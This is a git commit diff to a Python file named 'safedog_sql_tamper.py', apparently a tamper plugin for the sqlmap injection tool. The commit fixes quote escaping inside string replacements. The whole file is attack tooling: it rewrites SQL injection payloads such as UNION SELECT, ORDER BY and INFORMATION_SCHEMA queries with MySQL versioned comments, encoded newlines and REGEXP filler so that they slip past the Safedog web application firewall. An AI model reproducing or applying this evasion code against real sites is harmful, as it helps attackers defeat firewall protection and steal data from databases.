173ff456b94ccb34be2239dcb06e01cb0e6fb073
pureqh <45117428+pureqh@users.noreply.github.com>
2021-11-15 12:40:49 +0800

    Update safedog_sql_tamper.py

--- safedog_sql_tamper.py
+++ safedog_sql_tamper.py
@@ -24,16 +24,16 @@ def dependencies():
 def tamper(payload, **kwargs):
 
         payload=payload.replace(" ","  ",1)
-        payload=payload.replace("ORDER BY","REGEXP "[...%25%23]"   /*!11444order %0a by*/")
+        payload=payload.replace("ORDER BY","REGEXP \"[...%25%23]\"   /*!11444order %0a by*/")
         payload=payload.replace("union ALL SELECT","/*!11444union all%0a select*/")
         payload=payload.replace(" AND","/*!11444AND*/")
         payload=payload.replace("(SELECT (CASE","(/*!11444SELECT*/ %0a (CASE")
-        payload=payload.replace("UNION SELECT","/*!11444union*/  /*REGEXP "[...%25%23]"*/  %0a select /*REGEXP "[...%25%23]"*/")
-        payload=payload.replace("UNION ALL SELECT","REGEXP "[...%0a%23]" /*!11444union %0a select */ ")
+        payload=payload.replace("UNION SELECT","/*!11444union*/  /*REGEXP \"[...%25%23]\"*/  %0a select /*REGEXP \"[...%25%23]\"*/")
+        payload=payload.replace("UNION ALL SELECT","REGEXP \"[...%0a%23]\" /*!11444union %0a select */ ")
         payload=payload.replace("()","(%0a /*!80000aaa*/)")
         payload=payload.replace(" AS","/*!11444AS*/")
         payload=payload.replace("FROM","/*!11444FROM*/")
-        payload=payload.replace("INFORMATION_SCHEMA","/*like"%0a%23"*/ %0a  INFORMATION_SCHEMA")
+        payload=payload.replace("INFORMATION_SCHEMA","/*like\"%0a%23\"*/ %0a  INFORMATION_SCHEMA")
         payload=payload.replace("INFORMATION_SCHEMA.TABLES","%0a /*!11444INFORMATION_SCHEMA.TABLES*/")
-       
+        
         return payload
